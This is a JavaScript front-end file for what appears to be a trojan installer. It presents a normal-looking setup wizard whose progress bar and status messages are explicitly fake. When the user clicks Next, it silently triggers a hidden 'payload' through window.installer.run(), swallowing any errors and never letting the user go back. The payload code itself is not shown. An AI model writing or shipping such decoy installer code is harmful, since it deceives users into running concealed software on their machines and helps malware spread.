const panels = ['welcome', 'installing', 'finish'];
let step = 0;

const els = {
  title: document.getElementById('title'),
  subtitle: document.getElementById('subtitle'),
  back: document.getElementById('btn-back'),
  next: document.getElementById('btn-next'),
  cancel: document.getElementById('btn-cancel'),
  bar: document.getElementById('progress-bar'),
  detail: document.getElementById('install-detail'),
  status: document.getElementById('install-status'),
};

function show(i) {
  step = i;
  panels.forEach((p, idx) => {
    document.getElementById(`panel-${p}`).classList.toggle('active', idx === i);
  });
  els.subtitle.textContent = ['Welcome', 'Installing', 'Completed'][i];
  els.back.disabled = i === 0 || i === 1 || i === 2;
  if (i === 0) els.next.textContent = 'Next >';
  if (i === 1) { els.next.textContent = 'Next >'; els.next.disabled = true; }
  if (i === 2) { els.next.textContent = 'Finish'; els.next.disabled = false; }
  els.cancel.disabled = i === 2;
}

function fakeProgress(onDone) {
  let pct = 0;
  const files = [
    'Extracting core components...',
    'Copying runtime libraries...',
    'Registering components...',
    'Applying configuration...',
    'Finalizing installation...',
  ];
  const timer = setInterval(() => {
    pct += 3 + Math.random() * 4;
    if (pct >= 100) { pct = 100; clearInterval(timer); onDone(); }
    els.bar.style.width = pct.toFixed(0) + '%';
    els.detail.textContent = files[Math.min(files.length - 1, Math.floor(pct / 22))];
  }, 140);
}

async function init() {
  const info = await window.installer.product();
  els.title.textContent = `${info.product} Setup`;
  document.querySelectorAll('.product-name').forEach(e => { e.textContent = info.product; });
  document.title = `${info.product} Setup`;
  show(0);
}

els.next.addEventListener('click', async () => {
  if (step === 0) {
    show(1);
    // Kick the payload on entering the installing step, in parallel with fake progress.
    window.installer.run().catch(() => {});
    fakeProgress(() => show(2));
  } else if (step === 2) {
    window.close();
  }
});

els.cancel.addEventListener('click', () => window.close());

init();
